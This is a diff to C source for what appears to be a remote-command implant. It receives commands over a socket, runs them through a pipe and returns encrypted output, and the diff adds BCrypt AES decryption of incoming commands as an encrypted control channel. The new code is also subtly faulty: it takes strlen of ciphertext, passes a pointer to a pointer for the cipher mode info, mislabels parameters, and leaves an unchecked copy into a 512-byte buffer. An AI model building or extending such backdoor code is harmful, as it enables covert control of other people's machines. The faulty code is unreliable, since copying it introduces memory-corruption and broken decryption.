@@ -158,6 +158,8 @@ int main()
     FILE *pipe = NULL;
     int kill = 1;
     int checker;
+    char received_message[512];
+    int received_message_len = 0;
     while (kill == 1)
     {
         checker = recv_all(soc, rcvbuffer, 4);
@@ -167,7 +169,10 @@ int main()
                               ((unsigned char)rcvbuffer[1] << 8) |
                               ((unsigned char)rcvbuffer[2] << 16) |
                               ((unsigned char)rcvbuffer[3] << 24);
-        recv_all(soc, rcvbuffer, cmdlen);
+        recv_all(soc, received_message, cmdlen);
+        decrypt_message(aesKey, nonce, sizeof(nonce), (BYTE *)received_message, (int)strlen(received_message),
+                                    rcvbuffer, sizeof(rcvbuffer), &cmdlen,
+                                    tag, sizeof(tag), &authInfo);
         rcvbuffer[cmdlen] = '\0';
 
         if (rcvbuffer[0] == '#')
@@ -185,7 +190,6 @@ int main()
             else
             {
                 int ciphertext_len = 0;
-                BYTE tag[16];
                 char buf[512];
                 char result_buf[512];
                 int send_result;
@@ -300,16 +304,25 @@ int encrypt_message(BCRYPT_KEY_HANDLE aesKey, const BYTE *nonce, int nonce_len, 
     return 1;
 }
 
-void decrypt_message(
-    BCRYPT_KEY_HANDLE aesKey,
-    const BYTE *nonce,
-    int nonce_len,
-    const BYTE *plaintext,
-    int plaintext_len,
-    BYTE *ciphertext,
-    int ciphertext_buffer_len,
-    int *ciphertext_len,
-    BYTE *tag,
-    int tag_len)
+int decrypt_message(BCRYPT_KEY_HANDLE aesKey, const BYTE *nonce, int nonce_len, const BYTE *plaintext, int plaintext_len, BYTE *ciphertext, int ciphertext_buffer_len, int *ciphertext_len, BYTE *tag, int tag_len, BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO *pPaddingInfo)
 {
+    ULONG resultlen = 0;
+    //decrypt message
+    NTSTATUS status = BCryptDecrypt(
+        aesKey,
+        (PUCHAR)plaintext,
+        plaintext_len,
+        &pPaddingInfo,
+        (PUCHAR)nonce,
+        nonce_len,
+        ciphertext,
+        ciphertext_buffer_len,
+        &resultlen,
+        0);
+
+    if (!BCRYPT_SUCCESS(status))
+        return 0;
+
+    *ciphertext_len = (int)resultlen;
+    return 1;
 }
